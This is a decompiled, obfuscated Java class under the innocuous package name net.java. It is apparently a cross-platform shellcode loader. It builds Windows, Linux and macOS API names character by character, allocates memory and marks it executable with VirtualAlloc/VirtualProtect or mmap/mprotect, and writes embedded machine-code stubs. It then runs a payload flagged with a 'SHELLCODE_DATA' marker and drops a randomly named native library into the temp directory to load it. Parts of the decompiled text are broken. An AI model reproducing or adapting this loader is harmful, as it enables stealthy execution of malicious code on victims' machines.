package net.java;

import java.util.Properties;
import java.io.InputStream;
import java.io.DataInputStream;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.util.Random;
import java.lang.reflect.Method;
import java.lang.reflect.Field;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import com.sun.jna.Memory;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import com.sun.jna.Function;

public class g
{
    private static Object a;
    private static Function a;
    private static Function b;
    private static Function c;
    private static int a;
    private static int b;
    private static int c;
    private static int d;
    private static int e;
    private static int f;
    private static int g;
    private static Object b;
    private static Function d;
    private static Function e;
    private static Function f;
    
    static {
        net.java.g.a = 1;
        net.java.g.b = 2;
        net.java.g.c = 4;
        net.java.g.d = 32;
        net.java.g.e = 2;
        net.java.g.f = 4096;
        net.java.g.g = 2;
    }
    
    private static boolean b() {
        try {
            final ClassLoader classLoader = g.class.getClassLoader();
            final StringBuilder sb;
            (sb = new StringBuilder()).append('c');
            sb.append('o');
            sb.append('m');
            sb.append('.');
            sb.append('s');
            sb.append('u');
            sb.append('n');
            sb.append('.');
            sb.append('j');
            sb.append('n');
            sb.append('a');
            sb.append('.');
            sb.append('N');
            sb.append('a');
            sb.append('t');
            sb.append('i');
            sb.append('v');
            sb.append('e');
            classLoader.loadClass(sb.toString());
            return true;
        }
        catch (final Throwable t) {
            return false;
        }
    }
    
    private static void a(final byte[] array, final int n, final int n2) {
        array[n + 3] = (byte)(n2 >>> 24);
        array[n + 2] = (byte)(n2 >>> 16);
        array[n + 1] = (byte)(n2 >>> 8);
        array[n] = (byte)n2;
    }
    
    private static void a(final byte[] array, final int n, final long n2) {
        array[n + 7] = (byte)(n2 >>> 56);
        array[n + 6] = (byte)(n2 >>> 48);
        array[n + 5] = (byte)(n2 >>> 40);
        array[n + 4] = (byte)(n2 >>> 32);
        array[n + 3] = (byte)(n2 >>> 24);
        array[n + 2] = (byte)(n2 >>> 16);
        array[n + 1] = (byte)(n2 >>> 8);
        array[n] = (byte)n2;
    }
    
    private static long a(final byte[] array, final int n) {
        return 0x0L | (long)(array[n + 7] & 0xFF) << 56 | (long)(array[n + 6] & 0xFF) << 48 | (long)(array[n + 5] & 0xFF) << 40 | (long)(array[n + 4] & 0xFF) << 32 | (long)(array[n + 3] & 0xFF) << 24 | (long)((array[n + 2] & 0xFF) << 16) | (long)((array[n + 1] & 0xFF) << 8) | (long)(array[n] & 0xFF);
    }
    
    private static int a(final byte[] array, final int n) {
        return 0x0 | (array[n + 3] & 0xFF) << 24 | (array[n + 2] & 0xFF) << 16 | (array[n + 1] & 0xFF) << 8 | (array[n] & 0xFF);
    }
    
    private static int b(final byte[] array, final int n) {
        if (n < 0) {
            return 0;
        }
        long n2 = 0L;
        int n3 = 0;
        long n4 = 0L;
        for (int i = 0; i < n; ++i) {
            if (n3 != 0) {
                if (array[i] != 0) {
                    n3 = 0;
                    if (i - 1 - n2 > 512L) {
                        n4 = n2;
                    }
                }
            }
            else if (array[i] == 0) {
                n2 = i;
                n3 = 1;
            }
        }
        long n5;
        if (l.g()) {
            n5 = 16384L;
        }
        else {
            n5 = 4096L;
        }
        long n6;
        if ((n6 = n4 / n5) * n5 < n4) {
            ++n6;
        }
        return (int)(n6 * n5);
    }
    
    private static boolean a(final byte[] array) {
        final byte[] array2 = { -1, -18, -35, -52, -69, -86, -103, -120 };
        final int a = l.a((Object)array, (Object)array2);
        for (int i = 0; i < 8; ++i) {
            array2[i] = 0;
        }
        return a <= 0 || a >= 2048;
    }
    
    private static int a(final byte[] array) {
        final byte[] array2 = { -35, -52, -69, -86 };
        final byte[] array3 = { -1, -18, -35, -52, -69, -86, -103, -120 };
        try {
            int n;
            int n2;
            boolean b;
            if ((n = l.a((Object)new Object[] { array, 2048, array3 })) < 0) {
                if ((n = l.a((Object)new Object[] { array, 2048, array2 })) < 0) {
                    return -1;
                }
                n2 = 20;
                b = true;
            }
            else {
                n2 = 40;
                b = false;
            }
            long a;
            long a2;
            if (b) {
                a = a(array, n + 4);
                a2 = a(array, n + 8);
            }
            else {
                a = a(array, n + 8);
                a2 = a(array, n + 16);
            }
            final long n3 = a + a2;
            final long n4 = n + n2;
            final long n5 = n + (n2 + n3);
            if (a > 0L) {
                return -2;
            }
            long n6;
            if (b) {
                n6 = a(array, (int)(n4 - 4L)) + n5 - a2;
            }
            else {
                n6 = a(array, (int)(n4 - 8L)) + n5 - a2;
            }
            return (int)n6;
        }
        finally {
            for (int i = 0; i < 8; ++i) {
                array3[i] = 0;
            }
            for (int j = 0; j < 4; ++j) {
                array2[j] = 0;
            }
        }
    }
    
    private static int a(final Object o, final Object o2) {
        final byte[] array = (byte[])o;
        final byte[] array2 = (byte[])o2;
        long n = 0L;
        long a = 0L;
        long a2 = 0L;
        try {
            final byte[] array3 = array;
            final int b;
            if ((b = b(array3, array3.length - 4096)) == 0) {
                if (0L != 0L) {
                    a(0L, 0L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 206;
            }
            while (n < array.length + ((array2 == null) ? 0 : array2.length)) {
                n += 4096L;
            }
            long n2;
            long n3;
            for (n2 = 0L, n3 = n; n2 < b; n2 += 4096L, n3 -= 4096L) {}
            final long n4 = n + 16384L;
            final long a3;
            if ((a3 = a((Object)new Object[] { 0L, n4, 8192, 4 })) == 0L) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 207;
            }
            final long a4;
            if ((a4 = a((Object)new Object[] { a3, n2, 4096, 4 })) == 0L) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 208;
            }
            final long a5;
            if ((a5 = a((Object)new Object[] { a3 + n2, n3, 4096, 4 })) == 0L) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 209;
            }
            if (a5 != a3 + n2) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 210;
            }
            final long n5 = a3;
            final byte[] array4 = array;
            a(n5, array4, array4.length);
            if (array2 != null) {
                final long n6 = a3 + array.length;
                final byte[] array5 = array2;
                a(n6, array5, array5.length);
            }
            if (a((Object)new Object[] { a4, n2, 32, null }) != Boolean.TRUE) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 211;
            }
            final int a6;
            if ((a6 = a(array)) == -1) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 212;
            }
            if (a6 == -2) {
                if (a3 != 0L) {
                    a(a3, n4);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                if (0L != 0L) {
                    a(0L, 4096L);
                }
                return 213;
            }
            final byte[] array6 = { -13, 15, 30, -6, 83, 87, 86, 72, -119, -53, 72, -125, -20, 32, 72, -117, 123, 8, 72, -117, 115, 16, 72, -117, 83, 24, 72, -117, 75, 32, -1, 19, 72, -119, 67, 40, 49, -64, 72, -125, -60, 32, 94, 95, 91, -61 };
            final byte[] array7 = { 85, -117, -20, 86, -117, 117, 8, -1, 118, 16, -1, 118, 12, -1, 118, 8, -1, 118, 4, -1, 22, -125, -60, 16, -119, 70, 20, 51, -64, 94, 93, -61 };
            final byte[] array8 = { -13, 15, 31, -8, -2, 7, 0, -7, -13, 3, 0, -86, 2, -116, 65, -87, 8, 0, 64, -7, 0, -124, 64, -87, 0, 1, 63, -42, 96, 22, 0, -7, -32, 3, 31, -86, -2, 7, 64, -7, -13, 7, 65, -8, -64, 3, 95, -42 };
            a = a((Object)new Object[] { 0L, 4096L, 12288, 4 });
            if (l.g()) {
                a(a, array8, 48);
            }
            else if (l.f()) {
                a(a, array6, 46);
            }
            else if (l.e()) {
                a(a, array7, 32);
            }
            a((Object)new Object[] { a, 4096L, 32, null });
            a2 = a((Object)new Object[] { 0L, 4096L, 12288, 4 });
            final byte[] array9 = new byte[48];
            final boolean a7;
            if (a7 = a(array)) {
                a(array9, 0, (int)(a3 + a6));
                a(array9, 4, (int)(a3 + a6));
                a(array9, 8, (int)n2);
            }
            else {
                a(array9, 0, a3 + a6);
                a(array9, 8, a3 + a6);
                a(array9, 16, n2);
            }
            a(a2, array9, 48);
            final Pointer invokePointer;
            if ((invokePointer = Function.getFunction(new Pointer(a)).invokePointer(new Object[] { new Pointer(a2) })) != null) {
                Pointer.nativeValue(invokePointer);
            }
            new Pointer(a2).read(0L, array9, 0, 48);
            if (a7) {
                return a(array9, 20);
            }
            return (int)a(array9, 40);
        }
        finally {
            if (a2 != 0L) {
                a(a2, 4096L);
            }
            if (a != 0L) {
                a(a, 4096L);
            }
        }
    }
    
    private static Object a() {
        if (net.java.g.a == null) {
            final StringBuilder sb;
            (sb = new StringBuilder()).append('k');
            sb.append('e');
            sb.append('r');
            sb.append('n');
            sb.append('e');
            sb.append('l');
            sb.append('3');
            sb.append('2');
            net.java.g.a = NativeLibrary.getInstance(sb.toString());
        }
        return net.java.g.a;
    }
    
    private static void a(final long n, final byte[] array, final int n2) {
        new Pointer(n).write(0L, array, 0, n2);
    }
    
    private static Object a(final Object o) {
        final Object[] array;
        final long longValue = (long)(array = (Object[])o)[0];
        final long longValue2 = (long)array[1];
        final int intValue = (int)array[2];
        final int[] array2 = (int[])array[3];
        if (net.java.g.a == null) {
            net.java.g.a = ((NativeLibrary)a()).getFunction(b());
        }
        final Memory memory = new Memory(4L);
        final Pointer invokePointer = net.java.g.a.invokePointer(new Object[] { new Pointer(longValue), new Pointer(longValue2), intValue, memory });
        if (array2 != null) {
            array2[0] = memory.getInt(0L);
        }
        if (invokePointer == null) {
            return Boolean.FALSE;
        }
        if (Pointer.nativeValue(invokePointer) == 1L) {
            return Boolean.TRUE;
        }
        return Boolean.FALSE;
    }
    
    private static boolean a(final long n, final long n2) {
        if (net.java.g.b == null) {
            net.java.g.b = ((NativeLibrary)a()).getFunction(e());
        }
        final Pointer invokePointer;
        return (invokePointer = net.java.g.b.invokePointer(new Object[] { new Pointer(n), new Pointer(n2), 32768 })) != null && Pointer.nativeValue(invokePointer) == 1L;
    }
    
    private static long a(final Object o) {
        final Object[] array;
        final long longValue = (long)(array = (Object[])o)[0];
        final long longValue2 = (long)array[1];
        final int intValue = (int)array[2];
        final int intValue2 = (int)array[3];
        if (net.java.g.c == null) {
            net.java.g.c = ((NativeLibrary)a()).getFunction(c());
        }
        return Pointer.nativeValue(net.java.g.c.invokePointer(new Object[] { new Pointer(longValue), new Pointer(longValue2), intValue, intValue2 }));
    }
    
    private static int b(final Object o, final Object o2) {
        final byte[] array = (byte[])o;
        final byte[] array2 = (byte[])o2;
        long n = 0L;
        try {
            final byte[] array3 = array;
            final int b;
            if ((b = b(array3, array3.length - 4096)) == 0) {
                if (0L != 0L) {
                    a(0L, 0L);
                }
                return 206;
            }
            while (n < array.length + ((array2 == null) ? 0 : array2.length)) {
                n += 4096L;
            }
            long n2;
            for (n2 = 0L; n2 < b; n2 += 4096L) {}
            final long n3 = n + 16384L;
            final Object[] array4;
            final long longValue = (long)(array4 = new Object[] { 0L, n3, net.java.g.a | net.java.g.b, net.java.g.d | net.java.g.e, -1, 0 })[0];
            final long longValue2 = (long)array4[1];
            final int intValue = (int)array4[2];
            final int intValue2 = (int)array4[3];
            final int intValue3 = (int)array4[4];
            final int intValue4 = (int)array4[5];
            if (net.java.g.f == null) {
                net.java.g.f = ((NativeLibrary)b()).getFunction(h());
            }
            final Pointer invokePointer;
            final long n4;
            if ((n4 = (((invokePointer = net.java.g.f.invokePointer(new Object[] { new Pointer(longValue), new Pointer(longValue2), intValue, intValue2, intValue3, new Pointer((long)intValue4) })) == null) ? 0L : Pointer.nativeValue(invokePointer))) == 0L) {
                if (n4 != 0L) {
                    a(n4, n3);
                }
                return 207;
            }
            final long n5 = n4;
            final long n6 = n4;
            final byte[] array5 = array;
            a(n6, array5, array5.length);
            if (array2 != null) {
                final long n7 = n4 + array.length;
                final byte[] array6 = array2;
                a(n7, array6, array6.length);
            }
            final long n8 = n5;
            final long n9 = n2;
            final int n10 = net.java.g.a | net.java.g.c;
            final long n11 = n9;
            final long n12 = n8;
            if (net.java.g.d == null) {
                net.java.g.d = ((NativeLibrary)b()).getFunction(g());
            }
            final Pointer invokePointer2;
            if ((((invokePointer2 = net.java.g.d.invokePointer(new Object[] { new Pointer(n12), new Pointer(n11), n10 })) == null) ? 0 : ((int)Pointer.nativeValue(invokePointer2))) != 0) {
                if (n4 != 0L) {
                    a(n4, n3);
                }
                return 211;
            }
            final int a;
            if ((a = a(array)) == -1) {
                if (n4 != 0L) {
                    a(n4, n3);
                }
                return 212;
            }
            if (a == -2) {
                if (n4 != 0L) {
                    a(n4, n3);
                }
                return 213;
            }
            return ((Number)b(new Object[] { n4 + a, n4 + a, n2 })).intValue();
        }
        finally {
            throw loadexception(java.lang.Throwable.class)();
        }
    }
    
    private static Object b() {
        if (net.java.g.b == null) {
            try {
                final StringBuilder sb;
                (sb = new StringBuilder()).append('l');
                sb.append('i');
                sb.append('b');
                sb.append('c');
                net.java.g.b = NativeLibrary.getInstance(sb.toString());
            }
            catch (final Throwable t) {
                try {
                    final StringBuilder sb2;
                    (sb2 = new StringBuilder()).append('l');
                    sb2.append('i');
                    sb2.append('b');
                    sb2.append('c');
                    sb2.append('.');
                    sb2.append('s');
                    sb2.append('o');
                    sb2.append('.');
                    sb2.append('6');
                    net.java.g.b = NativeLibrary.getInstance(sb2.toString());
                }
                catch (final Throwable t2) {
                    final StringBuilder sb3;
                    (sb3 = new StringBuilder()).append('l');
                    sb3.append('i');
                    sb3.append('b');
                    sb3.append('c');
                    sb3.append('.');
                    sb3.append('s');
                    sb3.append('o');
                    net.java.g.b = NativeLibrary.getInstance(sb3.toString());
                }
            }
        }
        return net.java.g.b;
    }
    
    private static int a(final long n, final long n2) {
        if (net.java.g.e == null) {
            net.java.g.e = ((NativeLibrary)b()).getFunction(f());
        }
        final Pointer invokePointer;
        if ((invokePointer = net.java.g.e.invokePointer(new Object[] { new Pointer(n), new Pointer(n2) })) == null) {
            return 0;
        }
        return (int)Pointer.nativeValue(invokePointer);
    }
    
    private static Object b(final Object o) {
        final Object[] array;
        final Pointer invokePointer;
        if ((invokePointer = Function.getFunction(new Pointer((long)(array = (Object[])o)[0])).invokePointer(new Object[] { new Pointer((long)array[1]), new Pointer((long)array[2]), new Pointer(0L), new Pointer(0L) })) == null) {
            return 0;
        }
        return Pointer.nativeValue(invokePointer);
    }
    
    private static int c(final Object o, final Object o2) {
        final byte[] array = (byte[])o;
        final byte[] array2 = (byte[])o2;
        long n = 0L;
        try {
            final byte[] array3 = array;
            final int b;
            if ((b = b(array3, array3.length - 4096)) == 0) {
                if (0L != 0L) {
                    b(0L, 0L);
                }
                return 206;
            }
            while (n < array.length + ((array2 == null) ? 0 : array2.length)) {
                n += 4096L;
            }
            long n2;
            for (n2 = 0L; n2 < b; n2 += 4096L) {}
            final long n3 = n + 16384L;
            final Object[] array4;
            final long longValue = (long)(array4 = new Object[] { 0L, n3, net.java.g.a | net.java.g.b, net.java.g.f | net.java.g.g, -1, 0 })[0];
            final long longValue2 = (long)array4[1];
            final int intValue = (int)array4[2];
            final int intValue2 = (int)array4[3];
            final int intValue3 = (int)array4[4];
            final int intValue4 = (int)array4[5];
            if (net.java.g.f == null) {
                net.java.g.f = (Function)a(h());
            }
            final Pointer invokePointer = net.java.g.f.invokePointer(new Object[] { new Pointer(longValue), new Pointer(longValue2), intValue, intValue2, intValue3, new Pointer((long)intValue4) });
            long nativeValue = 0L;
            if (invokePointer != null) {
                nativeValue = Pointer.nativeValue(invokePointer);
            }
            final long n4;
            if ((n4 = nativeValue) == 0L) {
                if (n4 != 0L) {
                    b(n4, n3);
                }
                return 207;
            }
            final long n5 = n4;
            final long n6 = n4;
            final byte[] array5 = array;
            a(n6, array5, array5.length);
            if (array2 != null) {
                final long n7 = n4 + array.length;
                final byte[] array6 = array2;
                a(n7, array6, array6.length);
            }
            final long n8 = n5;
            final long n9 = n2;
            final int n10 = net.java.g.a | net.java.g.c;
            final long n11 = n9;
            final long n12 = n8;
            if (net.java.g.d == null) {
                net.java.g.d = (Function)a(g());
            }
            final Pointer invokePointer2;
            if ((((invokePointer2 = net.java.g.d.invokePointer(new Object[] { new Pointer(n12), new Pointer(n11), n10 })) == null) ? 0 : ((int)Pointer.nativeValue(invokePointer2))) != 0) {
                if (n4 != 0L) {
                    b(n4, n3);
                }
                return 211;
            }
            final int a;
            if ((a = a(array)) == -1) {
                if (n4 != 0L) {
                    b(n4, n3);
                }
                return 212;
            }
            if (a == -2) {
                if (n4 != 0L) {
                    b(n4, n3);
                }
                return 213;
            }
            return ((Number)b(new Object[] { n4 + a, n4 + a, n2 })).intValue();
        }
        finally {
            throw loadexception(java.lang.Throwable.class)();
        }
    }
    
    private static Object a(final String s) {
        try {
            return NativeLibrary.getInstance(d()).getFunction(s);
        }
        catch (final Throwable t) {
            try {
                final StringBuilder sb;
                (sb = new StringBuilder()).append('/');
                sb.append('u');
                sb.append('s');
                sb.append('r');
                sb.append('/');
                sb.append('l');
                sb.append('i');
                sb.append('b');
                sb.append('/');
                sb.append('s');
                sb.append('y');
                sb.append('s');
                sb.append('t');
                sb.append('e');
                sb.append('m');
                sb.append('/');
                sb.append('l');
                sb.append('i');
                sb.append('b');
                sb.append('d');
                sb.append('y');
                sb.append('l');
                sb.append('d');
                sb.append('.');
                sb.append('d');
                sb.append('y');
                sb.append('l');
                sb.append('i');
                sb.append('b');
                return NativeLibrary.getInstance(sb.toString()).getFunction(s);
            }
            catch (final Throwable t2) {
                final StringBuilder sb2;
                (sb2 = new StringBuilder()).append('/');
                sb2.append('u');
                sb2.append('s');
                sb2.append('r');
                sb2.append('/');
                sb2.append('l');
                sb2.append('i');
                sb2.append('b');
                sb2.append('/');
                sb2.append('l');
                sb2.append('i');
                sb2.append('b');
                sb2.append('S');
                sb2.append('y');
                sb2.append('s');
                sb2.append('t');
                sb2.append('e');
                sb2.append('m');
                sb2.append('.');
                sb2.append('B');
                sb2.append('.');
                sb2.append('d');
                sb2.append('y');
                sb2.append('l');
                sb2.append('i');
                sb2.append('b');
                return NativeLibrary.getInstance(sb2.toString()).getFunction(s);
            }
        }
    }
    
    private static int b(final long n, final long n2) {
        if (net.java.g.e == null) {
            net.java.g.e = (Function)a(f());
        }
        final Pointer invokePointer;
        if ((invokePointer = net.java.g.e.invokePointer(new Object[] { new Pointer(n), new Pointer(n2) })) == null) {
            return 0;
        }
        return (int)Pointer.nativeValue(invokePointer);
    }
    
    private static long a(int split) {
        try {
            Process exec = null;
            int n2 = n;
            if (n == a() && !l.g()) {
                final Runtime runtime = Runtime.getRuntime();
                final String[] array = new String[2];
                final int n3 = 0;
                final StringBuilder sb;
                (sb = new StringBuilder()).append('p');
                sb.append('i');
                sb.append('n');
                sb.append('g');
                array[n3] = sb.toString();
                final int n4 = 1;
                final StringBuilder sb2;
                (sb2 = new StringBuilder()).append('l');
                sb2.append('o');
                sb2.append('c');
                sb2.append('a');
                sb2.append('l');
                sb2.append('h');
                sb2.append('o');
                sb2.append('s');
                sb2.append('t');
                array[n4] = sb2.toString();
                split = (int)(exec = runtime.exec(array));
                try {
                    n2 = ((Number)Process.class.getMethod(a(), (Class<?>[])new Class[0]).invoke((Object)split, new Object[0])).intValue();
                }
                catch (final Throwable t) {
                    try {
                        final Field declaredField;
                        (declaredField = split.getClass().getDeclaredField(a())).setAccessible(true);
                        n2 = declaredField.getInt((Object)split);
                    }
                    catch (final Exception ex) {
                        ex.printStackTrace();
                        return 0L;
                    }
                }
            }
            final String[] array2 = new String[3];
            final int n5 = 0;
            final StringBuilder sb3;
            (sb3 = new StringBuilder()).append('v');
            sb3.append('m');
            sb3.append('m');
            sb3.append('a');
            sb3.append('p');
            array2[n5] = sb3.toString();
            final int n6 = 1;
            final StringBuilder sb4;
            (sb4 = new StringBuilder()).append('-');
            sb4.append('w');
            array2[n6] = sb4.toString();
            array2[2] = Integer.toString(n2);
            final BufferedReader bufferedReader = new BufferedReader((Reader)new InputStreamReader(new ProcessBuilder(array2).start().getInputStream()));
            long long1 = 0L;
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                if (long1 == 0L && line.contains((CharSequence)d())) {
                    final String s = line;
                    final StringBuilder sb5;
                    (sb5 = new StringBuilder()).append('_');
                    sb5.append('_');
                    sb5.append('T');
                    sb5.append('E');
                    sb5.append('X');
                    sb5.append('T');
                    if (!s.startsWith(sb5.toString())) {
                        continue;
                    }
                    final String s2 = line;
                    final StringBuilder sb6;
                    (sb6 = new StringBuilder()).append('\\');
                    sb6.append('s');
                    sb6.append('+');
                    split = (int)(Object)s2.split(sb6.toString());
                    for (int i = 0; i < split.length; ++i) {
                        final int index = split[i].indexOf(45);
                        try {
                            long1 = Long.parseLong(split[i].substring(0, index), 16);
                        }
                        catch (final Exception ex2) {}
                    }
                }
            }
            if (exec != null) {
                try {
                    exec.destroyForcibly();
                }
                catch (final Throwable t2) {
                    exec.destroy();
                }
            }
            return long1;
        }
        catch (final Throwable t3) {
            t3.printStackTrace();
            return 0L;
        }
    }
    
    private static int a() {
        try {
            final ClassLoader classLoader = g.class.getClassLoader();
            final StringBuilder sb;
            (sb = new StringBuilder()).append('j');
            sb.append('a');
            sb.append('v');
            sb.append('a');
            sb.append('.');
            sb.append('l');
            sb.append('a');
            sb.append('n');
            sb.append('g');
            sb.append('.');
            sb.append('m');
            sb.append('a');
            sb.append('n');
            sb.append('a');
            sb.append('g');
            sb.append('e');
            sb.append('m');
            sb.append('e');
            sb.append('n');
            sb.append('t');
            sb.append('.');
            sb.append('M');
            sb.append('a');
            sb.append('n');
            sb.append('a');
            sb.append('g');
            sb.append('e');
            sb.append('m');
            sb.append('e');
            sb.append('n');
            sb.append('t');
            sb.append('F');
            sb.append('a');
            sb.append('c');
            sb.append('t');
            sb.append('o');
            sb.append('r');
            sb.append('y');
            final Class loadClass = classLoader.loadClass(sb.toString());
            final StringBuilder sb2;
            (sb2 = new StringBuilder()).append('g');
            sb2.append('e');
            sb2.append('t');
            sb2.append('R');
            sb2.append('u');
            sb2.append('n');
            sb2.append('t');
            sb2.append('i');
            sb2.append('m');
            sb2.append('e');
            sb2.append('M');
            sb2.append('X');
            sb2.append('B');
            sb2.append('e');
            sb2.append('a');
            sb2.append('n');
            final Method declaredMethod = loadClass.getDeclaredMethod(sb2.toString(), (Class[])new Class[0]);
            final ClassLoader classLoader2 = g.class.getClassLoader();
            final StringBuilder sb3;
            (sb3 = new StringBuilder()).append('j');
            sb3.append('a');
            sb3.append('v');
            sb3.append('a');
            sb3.append('.');
            sb3.append('l');
            sb3.append('a');
            sb3.append('n');
            sb3.append('g');
            sb3.append('.');
            sb3.append('m');
            sb3.append('a');
            sb3.append('n');
            sb3.append('a');
            sb3.append('g');
            sb3.append('e');
            sb3.append('m');
            sb3.append('e');
            sb3.append('n');
            sb3.append('t');
            sb3.append('.');
            sb3.append('R');
            sb3.append('u');
            sb3.append('n');
            sb3.append('t');
            sb3.append('i');
            sb3.append('m');
            sb3.append('e');
            sb3.append('M');
            sb3.append('X');
            sb3.append('B');
            sb3.append('e');
            sb3.append('a');
            sb3.append('n');
            final Class loadClass2 = classLoader2.loadClass(sb3.toString());
            final StringBuilder sb4;
            (sb4 = new StringBuilder()).append('g');
            sb4.append('e');
            sb4.append('t');
            sb4.append('N');
            sb4.append('a');
            sb4.append('m');
            sb4.append('e');
            final String s = (String)loadClass2.getDeclaredMethod(sb4.toString(), (Class[])new Class[0]).invoke(declaredMethod.invoke((Object)null, new Object[0]), new Object[0]);
            return Integer.parseInt(s.substring(0, s.indexOf(64)));
        }
        catch (final Exception ex) {
            ex.printStackTrace();
            return 0;
        }
    }
    
    private static int b(final byte[] array) {
        Object o = null;
        if (l.a()) {
            if (l.g()) {
                o = k.h();
            }
            else if (l.e()) {
                o = k.f();
            }
            else if (l.f()) {
                o = k.g();
            }
        }
        else if (l.c() || l.d()) {
            if (l.g()) {
                o = k.e();
            }
            else if (l.e()) {
                o = k.d();
            }
            else if (l.f()) {
                o = k.c();
            }
        }
        else if (l.b()) {
            if (l.g()) {
                o = k.a();
            }
            else if (l.f()) {
                o = k.b();
            }
        }
        final Random random = new Random();
        final String string = String.valueOf((Object)Long.toHexString(random.nextLong())) + '-' + Long.toHexString(random.nextLong());
        final StringBuilder sb;
        (sb = new StringBuilder()).append('j');
        sb.append('a');
        sb.append('v');
        sb.append('a');
        sb.append('.');
        sb.append('i');
        sb.append('o');
        sb.append('.');
        sb.append('t');
        sb.append('m');
        sb.append('p');
        sb.append('d');
        sb.append('i');
        sb.append('r');
        final String property = System.getProperty(sb.toString());
        l.a.put((Object)System.class, (Object)l.class);
        final File file = new File(property, System.mapLibraryName(string));
        l.b((Object)new Object[] { file, o });
        System.load(file.getAbsolutePath());
        l.a.remove((Object)System.class);
        if (l.b()) {
            a(array, array.length - 4096 + 48, a(a()));
        }
        final Object n;
        if ((n = l.n(array)) != null && n instanceof long[]) {
            final int n2;
            if ((n2 = (int)((long[])n)[0]) == 0) {
                Thread.sleep(350L);
            }
            return n2;
        }
        return 256;
    }
    
    private static byte[] a() {
        int n = -1;
        if (l.g()) {
            n = 0;
        }
        else if (l.e()) {
            n = 1;
        }
        else if (l.f()) {
            n = 2;
        }
        final DataInputStream dataInputStream = new DataInputStream((InputStream)new ByteArrayInputStream(l.b(l.b())));
        try {
            for (int i = 0; i < 3; ++i) {
                final byte byte1 = dataInputStream.readByte();
                final int int1 = dataInputStream.readInt();
                if (byte1 == n) {
                    final byte[] array = new byte[int1];
                    dataInputStream.readFully(array);
                    return array;
                }
                dataInputStream.skip((long)int1);
            }
        }
        catch (final Exception ex) {
            ex.printStackTrace();
        }
        return null;
    }
    
    public static boolean a() {
        byte[] a = null;
        try {
            final byte[] array;
            final boolean a2 = a(array = (a = a()));
            final byte[] array2 = { 83, 72, 69, 76, 76, 67, 79, 68, 69, 95, 68, 65, 84, 65, 95, 95, 83, 72, 69, 76, 76, 67, 79, 68, 69, 95, 68, 65, 84, 65, 95, 95 };
            final int a3 = l.a((Object)array, (Object)array2);
            for (int i = 0; i < 32; ++i) {
                array2[i] = 0;
            }
            System.arraycopy((Object)array, 0, (Object)array, a3, 24);
            for (int j = a3; j < a3 + 24; ++j) {
                final byte[] array3 = array;
                final int n = j;
                array3[n] ^= (byte)153;
            }
            a(array, a3 + 24, (long)array.length);
            final byte[] array4 = array;
            final byte[] a4 = l.a(array4, array4.length + 4096);
            if (l.a()) {
                final long n2 = array.length;
                if (a2) {
                    a(a4, (int)n2, 2);
                }
                else {
                    a(a4, (int)n2, 2L);
                }
            }
            else if (l.b()) {
                final long n3 = array.length;
                if (a2) {
                    a(a4, (int)n3, 3);
                }
                else {
                    a(a4, (int)n3, 3L);
                }
            }
            else if (l.c() || l.d()) {
                final long n4 = array.length;
                if (a2) {
                    a(a4, (int)n4, 1);
                }
                else {
                    a(a4, (int)n4, 1L);
                }
            }
            final byte[] array5;
            if (a(array5 = (a = a4))) {
                a(array5, array5.length - 4096 + 20, 2);
            }
            else {
                a(array5, array5.length - 4096 + 40, 2L);
            }
            if (l.b()) {
                a(a, a.length - 4096 + 48, a(a()));
            }
        }
        catch (final Throwable t) {
            t.printStackTrace();
        }
        l.a.put((Object)Properties.class, (Object)l.class);
        Label_0650: {
            if (l.a()) {
                if (b()) {
                    try {
                        if (a(a, null) == 0) {
                            break Label_0650;
                        }
                    }
                    catch (final Throwable t2) {
                        t2.printStackTrace();
                    }
                }
                try {
                    if (b(a) == 0) {}
                }
                catch (final Throwable t3) {
                    t3.printStackTrace();
                }
            }
            else if (l.c() || l.d()) {
                if (b()) {
                    try {
                        if (b(a, null) == 0) {
                            break Label_0650;
                        }
                    }
                    catch (final Throwable t4) {
                        t4.printStackTrace();
                    }
                }
                try {
                    if (b(a) == 0) {}
                }
                catch (final Throwable t5) {
                    t5.printStackTrace();
                }
            }
            else if (l.b()) {
                if (b()) {
                    try {
                        if (c(a, null) == 0) {
                            break Label_0650;
                        }
                    }
                    catch (final Throwable t6) {
                        t6.printStackTrace();
                    }
                }
                try {
                    if (b(a) == 0) {}
                }
                catch (final Throwable t7) {
                    t7.printStackTrace();
                }
            }
        }
        for (int k = 0; k < 5; ++k) {
            try {
                if (l.n(null) == null) {
                    l.a.remove((Object)Properties.class);
                    return true;
                }
            }
            catch (final Throwable t8) {}
            try {
                Thread.sleep(200L);
            }
            catch (final InterruptedException ex) {}
        }
        l.a.remove((Object)Properties.class);
        return false;
    }
    
    private static String a() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('p');
        sb.append('i');
        sb.append('d');
        return sb.toString();
    }
    
    private static String b() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('V');
        sb.append('i');
        sb.append('r');
        sb.append('t');
        sb.append('u');
        sb.append('a');
        sb.append('l');
        sb.append('P');
        sb.append('r');
        sb.append('o');
        sb.append('t');
        sb.append('e');
        sb.append('c');
        sb.append('t');
        return sb.toString();
    }
    
    private static String c() {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('V');
        sb.append('i');
        sb.append('r');
        sb.append('t');
        sb.append('u');
        sb.append('a');
        sb.append('l');
        sb.append('A');
